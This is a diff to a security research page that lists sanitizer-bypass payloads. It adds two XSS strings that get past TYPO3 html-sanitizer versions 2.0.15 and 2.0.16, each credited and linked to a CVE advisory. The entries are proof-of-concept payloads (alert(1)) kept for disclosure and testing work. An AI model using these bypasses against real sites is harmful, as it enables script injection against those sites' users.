@@ -31,3 +31,10 @@ This page contains some examples of payloads used to bypass sanitizers in the pa
 | Version | Payload                                                                      | Credit              | Additional links                                                          |
 |---------|------------------------------------------------------------------------------|---------------------|---------------------------------------------------------------------------|
 | v20190215   | `<noscript><p title="</noscript><img src=x onerror=alert(1)>">` | Masato Kinugawa [@kinugawamasato](https://twitter.com/kinugawamasato) | <https://github.com/google/closure-library/commit/c79ab48e8e962fee57e68739c00e16b9934c0ffa> <https://www.youtube.com/watch?v=lG7U3fuNw3A> |
+
+## Typo3 html-sanitizer
+| Version | Payload                                                                      | Credit              | Additional links                                                          |
+|---------|------------------------------------------------------------------------------|---------------------|---------------------------------------------------------------------------|
+| 2.0.15   |  `<!--a foo=--!><img src=x onerror=alert(1)><!--<a>">` | David Klein [@ncd_leeN](https://twitter.com/ncd_leeN) | [CVE-2022-36020](https://github.com/TYPO3/html-sanitizer/security/advisories/GHSA-47m6-46mj-p235) |
+| 2.0.16   | `<![CDATA[<math><img src=x onerror=alert(1)>]]>`     | David Klein [@ncd_leeN](https://twitter.com/ncd_leeN) | [CVE-2022-23499](https://github.com/TYPO3/html-sanitizer/security/advisories/GHSA-hvwx-qh2h-xcfj) |
+
